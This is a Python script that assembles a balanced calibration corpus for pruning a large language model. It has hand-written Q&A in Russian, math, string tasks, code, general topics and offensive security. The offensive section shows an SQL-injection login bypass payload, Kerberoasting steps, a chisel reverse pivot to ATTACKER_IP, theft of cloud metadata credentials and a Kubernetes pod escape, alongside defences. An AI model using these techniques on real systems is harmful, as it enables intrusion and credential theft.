#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Balanced, domain-tagged calibration corpus for the REAP re-prune of Qwen3.5-397B.
Fixes the broken prune whose calib was 100% EN + all-offsec + prompt-only → RU/math/
char experts got 0 routing → pruned. Here: RU + math + char/precision + offsec(capped)
+ code + general, as FULL sequences (input+completion, not bare prompts), each tagged
with its domain so Phase-A can score PER-DOMAIN and Phase-B can union-floor.

Targets (EASY-EP mixed-domain: score per-domain → normalize → average; no domain starves):
  russian ≥15%  math ≥12%  precision ≥12%  offsec ≤25%  code ~18%  general ~15%
Size: hand-written cores below + HF-dataset slices (assemble()) → ~800 sequences,
max_len ~2048. Each entry is a realistic Q+A / full document so generation-time experts
(the ones prompt-only misses, EASY-EP) actually fire.
"""
from __future__ import annotations

# ---------------------------------------------------------------------------
# Hand-written cores — full input+output sequences, one per line-item.
# These GUARANTEE coverage of the exact skills our old prune killed.
# ---------------------------------------------------------------------------

RUSSIAN = [
    "Вопрос: Объясни простыми словами, что такое обратный прокси и зачем он нужен.\nОтвет: Обратный прокси — это сервер, который стоит перед одним или несколькими бэкенд-серверами и принимает запросы клиентов вместо них. Он распределяет нагрузку между бэкендами, кэширует ответы, завершает TLS-соединения и скрывает внутреннюю структуру сети. Клиент видит только прокси и не знает, какой именно сервер обработал запрос.",
    "Напиши короткое стихотворение о горах из четырёх строк.\nВершины в снегу молчаливо стоят,\nТуман по ущельям ползёт не спеша,\nОрлы над обрывом кругами парят,\nИ ветер поёт, тишину нарушая.",
    "Вопрос: Чем отличается процесс от потока в операционной системе?\nОтвет: Процесс — это независимая программа со своим адресным пространством, памятью и ресурсами. Поток — это единица выполнения внутри процесса; потоки одного процесса разделяют его память и ресурсы, но имеют свой стек и счётчик команд. Создание потока дешевле создания процесса, но ошибка в одном потоке может уронить весь процесс.",
    "Объясни, как работает протокол TCP при установке соединения.\nTCP устанавливает соединение через «тройное рукопожатие»: клиент отправляет пакет SYN с начальным номером последовательности; сервер отвечает пакетом SYN-ACK, подтверждая номер клиента и посылая свой; клиент отправляет ACK, подтверждая номер сервера. После этого соединение установлено и стороны могут обмениваться данными с гарантией доставки и порядка.",
    "Вопрос: Что такое SQL-инъекция и как от неё защититься?\nОтвет: SQL-инъекция — уязвимость, при которой злоумышленник внедряет свой SQL-код через пользовательский ввод, потому что приложение подставляет данные в запрос без экранирования. Защита: использовать параметризованные запросы (подготовленные выражения), а не конкатенацию строк; валидировать и ограничивать ввод; давать учётной записи БД минимальные права; применять ORM.",
    "Расскажи, как приготовить простой борщ.\nСварите мясной бульон. Обжарьте лук, морковь и свёклу, добавьте томатную пасту. В бульон положите картофель и капусту, варите до полуготовности, затем добавьте зажарку. Приправьте солью, перцем, лавровым листом, добавьте немного уксуса или лимонного сока для цвета. Подавайте со сметаной и зеленью.",
    "Вопрос: Объясни разницу между аутентификацией и авторизацией.\nОтвет: Аутентификация — это проверка того, КТО вы (подтверждение личности: пароль, токен, биометрия). Авторизация — это проверка того, ЧТО вам разрешено делать (права доступа к ресурсам). Сначала система аутентифицирует пользователя, затем авторизует его действия. Можно быть аутентифицированным, но не авторизованным для конкретной операции.",
    "Напиши три предложения о том, почему резервное копирование данных важно.\nРезервное копирование защищает от потери данных при сбоях оборудования, ошибках человека и атаках вроде программ-вымогателей. Регулярные бэкапы позволяют быстро восстановить работу без катастрофических последствий для бизнеса. Хорошая стратегия хранит копии в нескольких местах, включая офлайн или облако.",
    "Вопрос: Что такое контейнеризация и чем Docker отличается от виртуальной машины?\nОтвет: Контейнеризация упаковывает приложение с его зависимостями в изолированный контейнер, который использует ядро хостовой ОС. Виртуальная машина эмулирует целое оборудование и запускает полноценную гостевую ОС. Контейнеры легче, стартуют за секунды и потребляют меньше ресурсов, тогда как ВМ обеспечивают более сильную изоляцию за счёт накладных расходов.",
    "Объясни по-русски, как работает атака «человек посередине» (MITM).\nПри атаке «человек посередине» злоумышленник встаёт между двумя сторонами и незаметно перехватывает или подменяет их трафик. Например, в открытой Wi-Fi сети он может перенаправить трафик через себя (ARP-спуфинг) и читать незашифрованные данные. Защита — шифрование (HTTPS, TLS), проверка сертификатов и VPN.",
]

MATH = [
    # ===== ПЕРЕНОС-СЛОЖЕНИЕ (класс, который тоже ломался: 47+68) — числа НЕ из eval =====
    "Вопрос: Сколько будет 17 плюс 25?\nРешение: Единицы: 7 + 5 = 12, пишем 2, переносим 1. Десятки: 1 + 2 + 1 = 4. Ответ: 42.",
    "Question: A 245-byte payload plus a 178-byte decoder stub — total size?\nSolution: 245 + 178: ones 5+8=13 (write 3 carry 1), tens 4+7+1=12 (write 2 carry 1), hundreds 2+1+1=4. Total 423 bytes. Answer: 423.",
    "Вопрос: Сложи 1856 и 2977.\nРешение: 6+7=13 (3, перенос 1), 5+7+1=13 (3, перенос 1), 8+9+1=18 (8, перенос 1), 1+2+1=4. Ответ: 4833.",
    "Question: Add 96 and 47.\nSolution: ones 6+7=13 (3, carry 1), tens 9+4+1=14. Result 143. Answer: 143.",
    # ===== ЗАЁМ-ВЫЧИТАНИЕ (offset/size/padding — ядро эксплойт-математики) =====
    "Question: A stack buffer starts at 0x7fffffffe140 and the saved return address is at 0x7fffffffe1a8. What is the overflow offset in bytes?\nSolution: Offset = 0xe1a8 − 0xe140 = 0x68 = 6*16 + 8 = 104. Answer: 104 bytes.",
    "Вопрос: Буфер 512 байт, шеллкод 189 байт. Сколько байт NOP-паддинга влезет перед ним?\nРешение: 512 − 189: единицы 2−9 заём → 12−9=3; десятки 0−8 заём → 10−8=2; сотни 4−1=3. Итого 323. Проверка: 189+323=512. Ответ: 323.",
    "Question: A memory region runs from 0x08048000 to 0x0804a000. Size in bytes?\nSolution: 0x0804a000 − 0x08048000 = 0x2000 = 2*4096 = 8192. Answer: 8192.",
    "Вопрос: Сохранённый RIP на смещении 136, локальный буфер на смещении 64. Дистанция?\nРешение: 136 − 64 = 72. Ответ: 72 байта.",
    "Question: A 1024-byte page already holds 745 bytes. How many bytes remain?\nSolution: 1024 − 745 = 1024 − 700 − 45 = 324 − 45 = 279. Check: 745 + 279 = 1024. Answer: 279.",
    "Question: Base image 0x00400000, function at 0x004011a9. File offset?\nSolution: 0x004011a9 − 0x00400000 = 0x11a9 = 4096 + 256 + 160 + 9 = 4521. Answer: 0x11a9 (4521).",
    "Вопрос: Из 2000-байтового бюджета вычли 999-байтовую ROP-цепочку и 50 байт выравнивания. Остаток?\nРешение: 2000 − 999 = 1001, 1001 − 50 = 951. Ответ: 951.",
    # ===== УМНОЖЕНИЕ / ДЕЛЕНИЕ (класс 84×12 тоже мажет) =====
    "Question: Compute 37 * 43.\nSolution: 37 * 43 = 37*40 + 37*3 = 1480 + 111 = 1591. Answer: 1591.",
    "Question: 8 bytes per entry times 256 entries?\nSolution: 8 * 256 = 2048 bytes. Answer: 2048.",
    "Вопрос: Умножь 23 на 17.\nРешение: 23*17 = 23*10 + 23*7 = 230 + 161 = 391. Ответ: 391.",
    "Question: A 4096-byte page divided into 16-byte chunks — how many?\nSolution: 4096 / 16 = 256. Answer: 256.",
    "Question: What is 144 divided by 12?\nSolution: 12 * 12 = 144, so 144 / 12 = 12. Answer: 12.",
    "Question: A server handles 2000 requests/sec. How many in 2.5 minutes?\nSolution: 2.5 min = 150 s. 2000 * 150 = 300000. Answer: 300000.",
    # ===== СТЕПЕНИ 2 / OVERFLOW =====
    "Question: What is 2^10, 2^16, and 2^20?\nSolution: 2^10 = 1024, 2^16 = 65536, 2^20 = 1048576. Answer: 1024, 65536, 1048576.",
    "Question: What is 2^32?\nSolution: 2^32 = 4294967296 (the 32-bit address space size). Answer: 4294967296.",
    "Question: In 32-bit arithmetic, 0xFFFFFFFF + 1 = ?\nSolution: 0xFFFFFFFF = 4294967295 is the 32-bit max; +1 overflows and wraps to 0x00000000 = 0. Answer: 0.",
    "Вопрос: Наибольший номер TCP-порта?\nРешение: Порт — 16-битное поле, 2^16 = 65536 значений (0..65535). Ответ: 65535.",
    # ===== HEX / DEC / BIN =====
    "Question: Convert 0xFF, 0x100, 0xdead to decimal.\nSolution: 0xFF = 255. 0x100 = 256. 0xdead = 13*4096 + 14*256 + 10*16 + 13 = 53248+3584+160+13 = 57005. Answer: 255, 256, 57005.",
    "Question: Convert decimal 255 to binary.\nSolution: 255 = 128+64+32+16+8+4+2+1 = 11111111. Answer: 0b11111111.",
    "Question: The ASCII value of 'A'?\nSolution: 'A' = 0x41 = 65. Answer: 65.",
    "Вопрос: Переведи 0x1A и 0x7F в десятичное.\nРешение: 0x1A = 1*16 + 10 = 26. 0x7F = 7*16 + 15 = 127. Ответ: 26 и 127.",
    # ===== БИТОВЫЕ ОПЕРАЦИИ =====
    "Question: Compute 0x41 XOR 0x20.\nSolution: 0100 0001 XOR 0010 0000 = 0110 0001 = 0x61 = 97 = 'a' (flips 'A'→'a'). Answer: 0x61.",
    "Question: Compute 0xFF AND 0x0F.\nSolution: 1111 1111 AND 0000 1111 = 0000 1111 = 0x0F = 15 (low nibble). Answer: 0x0F.",
    "Question: What is 1 << 10 and 1 << 20?\nSolution: 1 << 10 = 1024, 1 << 20 = 1048576. Answer: 1024, 1048576.",
    "Question: Convert Unix permission rwxr-xr-x to octal.\nSolution: r=4, w=2, x=1. Owner rwx=7, group r-x=5, other r-x=5. Answer: 755.",
    # ===== СЕТИ / САБНЕТТИНГ =====
    "Вопрос: Сколько пригодных для хостов адресов в /26?\nРешение: 32 − 26 = 6 бит хоста, 2^6 = 64, минус сеть и broadcast: 64 − 2 = 62. Ответ: 62.",
    "Question: How many /27 subnets fit in a /24?\nSolution: /27 has 2^(32-27)=32 addresses; /24 has 256. 256/32 = 8. Answer: 8.",
    "Question: Broadcast address of 192.168.1.0/26?\nSolution: /26 block size 64, first block .0–.63, broadcast is .63 → 192.168.1.63. Answer: 192.168.1.63.",
    "Question: How many usable hosts in a /22 subnet?\nSolution: 32 − 22 = 10 host bits, 2^10 = 1024, minus 2 = 1022. Answer: 1022.",
    "Question: Usable hosts in a /30?\nSolution: 2 host bits, 2^2 = 4, minus 2 = 2 (point-to-point). Answer: 2.",
    # ===== KEYSPACE / ПЕРЕБОР =====
    "Question: Keyspace of a 4-digit numeric PIN?\nSolution: 10^4 = 10000. Answer: 10000.",
    "Question: Scanning 65535 TCP ports at 500 ports/sec takes how long?\nSolution: 65535 / 500 ≈ 131 seconds. Answer: ~131 s.",
    "Вопрос: Сколько комбинаций у пароля из 8 строчных латинских букв?\nРешение: 26^8 = 208827064576 ≈ 2.09*10^11. Ответ: ~2.09*10^11.",
    # ===== КОДИРОВАНИЕ / РАЗМЕРЫ =====
    "Question: How many Base64 characters encode 100 bytes?\nSolution: 3 bytes → 4 chars, padded. ceil(100/3)=34 groups, 34*4 = 136. Answer: 136.",
    "Question: How many hex characters represent a 32-byte SHA-256 digest?\nSolution: 2 hex chars per byte, 32*2 = 64. Answer: 64.",
    "Question: A file is 3.5 GiB. How many bytes?\nSolution: 3.5 * 1024^3 = 3.5 * 1073741824 = 3758096384. Answer: 3758096384.",
    # ===== АЛГЕБРА / ПРОЦЕНТЫ =====
    "Вопрос: Реши 3x + 7 = 22.\nРешение: 3x = 22 − 7 = 15, x = 15/3 = 5. Ответ: 5.",
    "Вопрос: Найди 15% от 240.\nРешение: 10% = 24, 5% = 12, 15% = 36. Ответ: 36.",
]

PRECISION = [  # char-level / exact string / byte ops
    "Question: Reverse the string SECURITY.\nSolution: Writing the letters backwards: Y-T-I-R-U-C-E-S. Answer: YTIRUCES.",
    "Question: How many characters are in the word 'kubernetes'?\nSolution: k-u-b-e-r-n-e-t-e-s = 10 characters.",
    "Question: Reverse the word 'network'.\nSolution: t-e-n = ... writing backwards: k-r-o-w-t-e-n. Answer: krowten.",
    "Вопрос: Сколько букв в слове «безопасность»?\nРешение: б-е-з-о-п-а-с-н-о-с-т-ь = 12 букв.",
    "Question: Output the string 'admin' in uppercase and then reversed.\nSolution: Uppercase: ADMIN. Reversed: NIMDA.",
    "Question: How many times does the letter 's' appear in 'mississippi'?\nSolution: m-i-S-S-i-S-S-i-p-p-i → s appears 4 times.",
    "Question: Encode the string 'AB' as its ASCII byte values in hex.\nSolution: 'A' = 0x41, 'B' = 0x42. Answer: 41 42.",
    "Question: Produce a valid JSON object with keys host (string) and port (integer 8080), no trailing comma.\nSolution: {\"host\": \"example.com\", \"port\": 8080}",
    "Question: What is the 3rd character (1-indexed) of 'payload'?\nSolution: p(1) a(2) y(3) → 'y'.",
    "Question: Concatenate 'rev' and 'shell' then count total length.\nSolution: 'revshell' has 8 characters.",
    "Question: Write the bytes of a null-free 4-byte little-endian representation of the integer 0x08048000.\nSolution: little-endian bytes: 00 80 04 08 — note the 0x00 byte; a null-free constraint would require an alternative encoding or add/sub trick.",
    "Question: Base64-encode the ASCII string 'hi'.\nSolution: 'hi' = bytes 0x68 0x69 = 01101000 01101001 → 6-bit groups 011010 000110 1001(00) → aGk= (padding). Answer: aGk=",
    "Question: Reverse the digits of 13579.\nSolution: 1-3-5-7-9 backwards: 9-7-5-3-1. Answer: 97531.",
    "Вопрос: Сколько цифр в числе 4294967295?\nРешение: 4-2-9-4-9-6-7-2-9-5 = 10 цифр.",
    "Question: What is the 5th (1-indexed) byte of the hex string 'DEADBEEF01'?\nSolution: bytes: DE(1) AD(2) BE(3) EF(4) 01(5) → 0x01.",
    "Question: Uppercase every other character of 'password' starting from index 0.\nSolution: p(0)->P a(1) s(2)->S s(3) w(4)->W o(5) r(6)->R d(7) → PaSsWoRd.",
    "Question: Count the vowels in 'authentication'.\nSolution: a-u-t-h-e-n-t-i-c-a-t-i-o-n → vowels a,u,e,i,a,i,o = 7.",
    "Question: What is the last 2 characters of the SHA-256 hex digest ending in ...d41d8cd9?\nSolution: last two characters are 'd', '9' → 'd9'.",
    "Вопрос: Переставь буквы слова «токен» в обратном порядке.\nРешение: т-о-к-е-н наоборот: н-е-к-о-т. Ответ: некот.",
    "Question: Given the array [10,20,30,40,50], what is element at index 3?\nSolution: 0-indexed: 10(0) 20(1) 30(2) 40(3) → 40.",
    "Question: Convert the byte 0b01000001 to its ASCII character.\nSolution: 01000001 = 65 = 'A'.",
    "Question: Is the string '((a+b)*(c-d))' balanced in parentheses?\nSolution: track depth: ( 1 ( 2 ... ) 1 * ( 2 ... ) 1 ) 0 — ends at 0, never negative → balanced. Answer: yes.",
    "Question: Truncate the string 'authentication_token_value' to its first 12 characters.\nSolution: 'authentication_token_value'[:12] = 'authenticati'.",
    "Question: What is the XOR of the byte sequence 0x01, 0x02, 0x04, 0x08?\nSolution: 0x01^0x02=0x03; 0x03^0x04=0x07; 0x07^0x08=0x0F. Answer: 0x0F.",
    "Вопрос: Сколько раз буква «о» встречается в слове «производство»?\nРешение: п-р-о-и-з-в-о-д-с-т-в-о → буква «о» встречается 3 раза.",
]

OFFSEC = [  # capped — real red-team content (input+output)
    "Question: Explain a SQL injection auth-bypass payload for a login form and why it works.\nAnswer: For a query like SELECT * FROM users WHERE user='$u' AND pass='$p', supplying username ' OR '1'='1' -- makes the query SELECT * FROM users WHERE user='' OR '1'='1' --' AND pass='...'. The OR '1'='1' is always true and -- comments out the password check, returning the first user row and bypassing auth. Fix: parameterized queries.",
    "Question: Explain step by step how a Kerberoasting attack works and the tools.\nAnswer: 1) Enumerate service accounts with SPNs (GetUserSPNs.py -request or Rubeus kerberoast). 2) Request TGS tickets for those SPNs — the ticket is encrypted with the service account's NTLM hash (RC4) or AES key. 3) Extract the ticket and crack it offline (hashcat -m 13100) to recover the plaintext password. 4) Use the credentials for lateral movement. Defenses: long random passwords for service accounts, AES-only, and monitoring 4769 events.",
    "Question: Write a Python TCP port scanner for a host and range.\nAnswer:\n```python\nimport socket\ndef scan(host, start, end, timeout=1.0):\n    open_ports = []\n    for port in range(start, end + 1):\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(timeout)\n        if s.connect_ex((host, port)) == 0:\n            open_ports.append(port)\n        s.close()\n    return open_ports\n\nif __name__ == '__main__':\n    print(scan('127.0.0.1', 1, 1024))\n```",
    "Question: Set up a pivot with chisel to reach an internal /24 through a compromised jump host.\nAnswer: On your attacker box run the chisel server: ./chisel server -p 8080 --reverse. On the jump host run the client back to you as a reverse SOCKS proxy: ./chisel client ATTACKER_IP:8080 R:socks. Then add socks5 127.0.0.1 1080 to /etc/proxychains4.conf and run proxychains nmap -sT -Pn 10.0.0.0/24. Note proxychains forces full TCP connect, so use -sT (SYN scan won't traverse a SOCKS proxy).",
    "Question: Explain SSRF against the cloud metadata endpoint and IMDSv2.\nAnswer: If an app fetches a user-supplied URL, an attacker points it at 169.254.169.254 to read cloud metadata. On AWS IMDSv1 you could GET /latest/meta-data/iam/security-credentials/ROLE directly. IMDSv2 requires a session token: first PUT /latest/api/token with header X-aws-ec2-metadata-token-ttl-seconds: 21600, then pass X-aws-ec2-metadata-token on the GET. This yields temporary STS credentials for the instance role. Mitigate with IMDSv2-only, hop limit 1, and URL allow-lists.",
    "Question: How can a pod escape to the host in Kubernetes via a privileged/hostPath pod?\nAnswer: If you can create pods (or read a service-account token with such RBAC), schedule a pod with securityContext.privileged: true and hostPath volume mounting / at /host. Then chroot /host or write to the node filesystem (e.g., /host/etc/cron.d, or the kubelet's static-pod dir) to execute as root on the node. Also read the SA token at /var/run/secrets/kubernetes.io/serviceaccount/token and hit the API. Mitigate: PodSecurity admission (restricted), no privileged, no hostPath.",
    "Question: Explain a JWT alg=none authentication bypass and RS256→HS256 confusion.\nAnswer: alg=none: some libraries accept a JWT with header {\"alg\":\"none\"} and skip signature verification — an attacker forges any claims (e.g., admin=true) with an empty signature. RS256→HS256 confusion: the server verifies RS256 with a public key; if it also accepts HS256, the attacker signs a forged token with HMAC using the (public) RSA key as the secret, and the server verifies it as valid. Fix: pin the expected algorithm server-side.",
]

CODE = [
    "Question: Implement an LRU cache in Python with O(1) get and put.\nAnswer:\n```python\nfrom collections import OrderedDict\nclass LRU:\n    def __init__(self, cap):\n        self.cap = cap; self.d = OrderedDict()\n    def get(self, k):\n        if k not in self.d: return -1\n        self.d.move_to_end(k); return self.d[k]\n    def put(self, k, v):\n        if k in self.d: self.d.move_to_end(k)\n        self.d[k] = v\n        if len(self.d) > self.cap: self.d.popitem(last=False)\n```",
    "Question: Write a Go HTTP handler with a simple token-bucket rate limiter.\nAnswer:\n```go\nfunc limiter(next http.Handler) http.Handler {\n    lim := rate.NewLimiter(10, 20)\n    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n        if !lim.Allow() { http.Error(w, \"429\", http.StatusTooManyRequests); return }\n        next.ServeHTTP(w, r)\n    })\n}\n```",
    "Question: Why does my Postgres query do a seq scan instead of using the index on created_at?\nAnswer: Common causes: the WHERE clause wraps the column in a function (e.g., date(created_at)) so the index can't be used — use a range predicate instead; statistics are stale — run ANALYZE; the table is small so the planner prefers a seq scan; or an implicit type cast on the column. Check EXPLAIN (ANALYZE, BUFFERS) and consider a functional index if you must filter on an expression.",
    "Question: Write a bash heredoc that creates a script and runs it, avoiding quote escaping.\nAnswer:\n```bash\ncat <<'EOF' > /tmp/run.sh\n#!/bin/bash\necho \"value is $HOME and a literal \\$VAR\"\nEOF\nchmod +x /tmp/run.sh && /tmp/run.sh\n```\nThe quoted 'EOF' disables expansion inside the heredoc so $VAR stays literal.",
    "Question: Refactor nested callbacks into async/await in JavaScript.\nAnswer:\n```js\nasync function load(id) {\n  const user = await getUser(id);\n  const orders = await getOrders(user.id);\n  return { user, orders };\n}\n```",
    "Question: Write a Dockerfile for a multi-stage Go build with a distroless final image.\nAnswer:\n```dockerfile\nFROM golang:1.22 AS build\nWORKDIR /src\nCOPY . .\nRUN CGO_ENABLED=0 go build -o /app ./cmd/server\nFROM gcr.io/distroless/static\nCOPY --from=build /app /app\nENTRYPOINT [\"/app\"]\n```",
    "Question: Write a Rust function that returns the nth Fibonacci number iteratively.\nAnswer:\n```rust\nfn fib(n: u64) -> u64 {\n    let (mut a, mut b) = (0u64, 1u64);\n    for _ in 0..n { let t = a + b; a = b; b = t; }\n    a\n}\n```",
    "Question: Write a Kubernetes Deployment YAML with a readiness probe and resource limits.\nAnswer:\n```yaml\napiVersion: apps/v1\nkind: Deployment\nmetadata: {name: web}\nspec:\n  replicas: 2\n  selector: {matchLabels: {app: web}}\n  template:\n    metadata: {labels: {app: web}}\n    spec:\n      containers:\n      - name: web\n        image: web:1.0\n        readinessProbe: {httpGet: {path: /healthz, port: 8080}, initialDelaySeconds: 5}\n        resources: {limits: {cpu: '500m', memory: '256Mi'}}\n```",
    "Question: Write a SQL migration that adds a NOT NULL column with a default to a large existing table safely.\nAnswer:\n```sql\nALTER TABLE orders ADD COLUMN status text DEFAULT 'pending';\nUPDATE orders SET status = 'pending' WHERE status IS NULL;\nALTER TABLE orders ALTER COLUMN status SET NOT NULL;\n```\nAdding with a default first avoids a full-table rewrite lock on Postgres 11+; the NOT NULL is applied after backfill.",
    "Question: Write a Python decorator that retries a function on exception with exponential backoff.\nAnswer:\n```python\nimport time, functools\ndef retry(times=3, base=0.5):\n    def deco(fn):\n        @functools.wraps(fn)\n        def wrapper(*a, **kw):\n            for i in range(times):\n                try:\n                    return fn(*a, **kw)\n                except Exception:\n                    if i == times - 1: raise\n                    time.sleep(base * (2 ** i))\n        return wrapper\n    return deco\n```",
    "Question: Explain why a Go goroutine leak can happen with an unbuffered channel and how to fix it.\nAnswer: If a goroutine sends on an unbuffered channel and nothing ever receives (e.g., the receiver returned early on another path), the sender blocks forever — a leak. Fix: use a buffered channel sized for the known sends, select with a context.Done() case, or ensure every send has a guaranteed receiver (e.g., via sync.WaitGroup coordination).",
    "Question: Write a regex to validate a basic IPv4 address.\nAnswer:\n```\n^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$\n```\nEach octet is capped at 255 via three alternations (250-255, 200-249, 0-199 in effect).",
    "Question: Write a gRPC .proto message and service definition for a simple GetUser RPC.\nAnswer:\n```protobuf\nsyntax = \"proto3\";\nmessage GetUserRequest { int64 id = 1; }\nmessage GetUserResponse { int64 id = 1; string name = 2; }\nservice UserService { rpc GetUser(GetUserRequest) returns (GetUserResponse); }\n```",
    "Question: Write a pytest fixture that spins up and tears down a temporary SQLite database per test.\nAnswer:\n```python\nimport pytest, sqlite3\n@pytest.fixture\ndef db():\n    conn = sqlite3.connect(':memory:')\n    yield conn\n    conn.close()\n```",
    "Question: Write a TypeScript type-safe wrapper around fetch that parses JSON into a generic type.\nAnswer:\n```typescript\nasync function getJson<T>(url: string): Promise<T> {\n  const res = await fetch(url);\n  if (!res.ok) throw new Error(`HTTP ${res.status}`);\n  return res.json() as Promise<T>;\n}\n```",
    "Question: Write an awk one-liner to sum the 3rd column of a CSV file.\nAnswer:\n```bash\nawk -F, '{sum += $3} END {print sum}' file.csv\n```",
    "Question: Explain the difference between a Terraform 'plan' and 'apply', and why CI should gate on plan output.\nAnswer: 'plan' computes and shows the diff between current state and desired config without changing anything; 'apply' actually executes that diff against real infrastructure. CI should require a human (or policy check) to review the plan output before apply, since apply is the irreversible/high-blast-radius step — this catches unintended deletes/replacements before they happen.",
    "Question: Write a React custom hook that debounces a value.\nAnswer:\n```jsx\nfunction useDebounced(value, delay) {\n  const [v, setV] = useState(value);\n  useEffect(() => {\n    const t = setTimeout(() => setV(value), delay);\n    return () => clearTimeout(t);\n  }, [value, delay]);\n  return v;\n}\n```",
    "Question: Why can a naive C strcpy into a fixed buffer cause a stack buffer overflow, and what's the safe alternative?\nAnswer: strcpy copies until it hits a null terminator with no bounds check, so a source string longer than the destination buffer overwrites adjacent stack memory (saved registers, return address). Use strlcpy/strncpy with an explicit size cap, or better, a bounds-checked string type (std::string in C++, or snprintf-style formatting).",
]

GENERAL = [
    "Question: Explain how the TLS 1.3 handshake differs from TLS 1.2.\nAnswer: TLS 1.3 reduces the handshake to one round trip (1-RTT) and supports 0-RTT resumption, versus two round trips in 1.2. It removes legacy/insecure options (RSA key exchange, static DH, CBC, RC4), mandates forward-secret (EC)DHE, and encrypts more of the handshake. Cipher suites are simplified to AEAD-only.",
    "Question: What is the difference between latency and throughput?\nAnswer: Latency is the time for a single operation to complete (e.g., ms per request). Throughput is how many operations complete per unit time (e.g., requests per second). A system can have high throughput but high latency (batching) or low latency but low throughput; optimizing one can trade off the other.",
    "Question: Summarize why idempotency matters in API design.\nAnswer: An idempotent operation produces the same result whether called once or many times. It matters because networks retry: if a client resends a request after a timeout, an idempotent endpoint (e.g., PUT, or POST with an idempotency key) won't create duplicates or double-charge. It makes systems safe to retry and reason about.",
    "Question: Explain the CAP theorem in two sentences.\nAnswer: The CAP theorem states a distributed data store can guarantee at most two of Consistency, Availability, and Partition tolerance simultaneously. Since network partitions are unavoidable, real systems choose between consistency and availability during a partition (CP vs AP).",
    "Question: What is a race condition and how do you prevent it?\nAnswer: A race condition happens when the correctness of a program depends on the unpredictable timing of concurrent operations accessing shared state. Prevent it with synchronization (mutexes, atomics), immutable data, message passing, or transactions that make the critical section indivisible.",
]

# --- Load large pooled corpora fetched from S3 to CORPUS_DIR by the prune pod ---
# offsec pool (~26.5k from Fenrir-v2.0/CyberNative/Cyber-v1) overrides the 7 hand-written OFFSEC;
# crypto pool (75 Claude-gen Q&A). If files absent (smoke test), fall back to hand-written.
import os as _os, json as _json
_CORPUS_DIR = _os.environ.get("CORPUS_DIR", _os.path.join(_os.path.dirname(_os.path.abspath(__file__)), "corpus"))
def _load_pool(fn, fallback):
    p = _os.path.join(_CORPUS_DIR, fn)
    try:
        with open(p) as f:
            data = _json.load(f)
        if isinstance(data, list) and data:
            print(f"[calib] loaded pool {fn}: {len(data)} texts", flush=True)
            return data
    except Exception as e:  # noqa: BLE001
        print(f"[calib] pool {fn} not loaded ({e}); fallback={len(fallback)}", flush=True)
    return fallback
# v3c fix (2026-07-03): crypto = offsec категория 3 → ВЛИВАЕМ crypto в offsec-пул, НЕ отдельный домен.
# Причина: 7 доменов + KEEP_FRAC 0.29 дали math-слотов 148/7≈21 (деградация MATH 2/5 vs v2 5/5 при 184/6≈30).
# Фикс: 6 доменов (crypto→offsec) + KEEP_FRAC 0.34 → math-слотов 174/6≈29≈v2. STEM не добавляем.
OFFSEC = _load_pool("corpus_offsec_clean.json", OFFSEC) + _load_pool("corpus_crypto.json", [])

# domain -> (list of texts, target share). 6 доменов, offsec приоритет №1 (вкл crypto), math/precision доли
# восстановлены к ~v2 (качество их рейтинга). Слоты ≈ keep_g/6 (равные по round-robin).
CORES = {
    "offsec":    (OFFSEC,    0.30),
    "code":      (CODE,      0.16),
    "russian":   (RUSSIAN,   0.14),
    "math":      (MATH,      0.14),
    "precision": (PRECISION, 0.13),
    "general":   (GENERAL,   0.13),
}

# HF datasets to SCALE each domain to the target size (loaded in assemble()).
# Kept minimal + well-known; the pipeline can disable HF and use cores only.
HF_SLICES = {
    "russian":   [("IlyaGusev/gazeta", "train", "text")],          # RU news prose
    "math":      [("openai/gsm8k", "main:train", "question+answer")],
    "code":      [("bigcode/the-stack-smol", "train", "content")],
    "general":   [("allenai/c4", "en:train", "text")],
    # precision + offsec: cores only (no clean HF set); rely on hand-written + repetition
}


def assemble(target_total=800, use_hf=True, max_chars=6000):
    """Return a list of {text, domain} balanced by CORES shares. Cores first (guaranteed
    coverage), then HF slices to reach per-domain quotas. Falls back to cores-only if HF
    unavailable. Char cap ~ max_chars (~2k tokens)."""
    out = []
    for dom, (texts, share) in CORES.items():
        want = int(round(target_total * share)) or 1
        if len(texts) > want:
            # stride-sample for diversity (deterministic, spread across whole pool) — NOT first-N
            step = len(texts) / want
            picked = [texts[int(i * step)][:max_chars] for i in range(want)]
        else:
            picked = [t[:max_chars] for t in texts]
        if use_hf and dom in HF_SLICES and len(picked) < want:
            try:
                from datasets import load_dataset
                for spec, split, field in HF_SLICES[dom]:
                    name, _, cfg = spec.partition(":") if False else (spec, "", "")
                    # spec like "openai/gsm8k" + split "main:train"
                    ds_name = spec
                    cfg_name, _, sp = split.partition(":")
                    if sp == "":
                        cfg_name, sp = None, cfg_name
                    ds = load_dataset(ds_name, cfg_name, split=sp, streaming=True)
                    for row in ds:
                        if len(picked) >= want:
                            break
                        if "+" in field:
                            a, b = field.split("+"); txt = f"{row.get(a,'')}\n{row.get(b,'')}"
                        else:
                            txt = row.get(field, "")
                        txt = (txt or "").strip()
                        if len(txt) > 80:
                            picked.append(txt[:max_chars])
            except Exception as e:  # noqa: BLE001
                print(f"[calib] HF load failed for {dom} ({e}); cores-only for this domain", flush=True)
        for t in picked[:want]:
            out.append({"text": t, "domain": dom})
    return out


if __name__ == "__main__":
    import collections
    corpus = assemble(use_hf=False)  # cores-only smoke test (no HF pull)
    by = collections.Counter(c["domain"] for c in corpus)
    print("cores-only corpus:", len(corpus), "seqs")
    for d, n in by.items():
        print(f"  {d:10s} {n}")
